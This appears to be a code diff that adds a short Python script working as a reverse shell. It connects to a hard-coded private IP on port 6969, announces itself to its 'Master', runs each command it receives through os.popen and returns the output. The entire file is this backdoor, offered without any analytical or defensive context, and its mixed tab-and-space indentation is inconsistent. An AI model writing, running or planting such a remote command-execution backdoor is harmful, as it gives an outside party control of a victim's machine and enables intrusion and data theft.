@@ -1,0 +1,37 @@
+import socket, sys, select, os
+
+ipaddr = "192.168.32.195"
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+sock.connect ((ipaddr, 6969))
+#sock.setblocking(0)
+sock.send("Hello Master its me: " + ipaddr)
+while (1):
+	cmd =''
+	try:
+ 		read, write, err = select.select([sock],[], [])
+		for IO in read:
+			if IO is sock:
+				data = sock.recv(4096)
+				if data:
+					print ('received: ' + data)
+					cmd = os.popen(data).read()
+                                        sock.send(cmd)
+				else:
+					sock.close()
+					sys.exit()
+			#else:
+				#cmd = sys.stdin.readline()
+				#if cmd == "exit\n":
+				#	sys.exit()
+				#else:
+				#	sock.send(cmd)
+
+	except Exception as e:
+		print (e)
+		sock.close()
+		sys.exit(0)
+
+#sock.close()
+
+
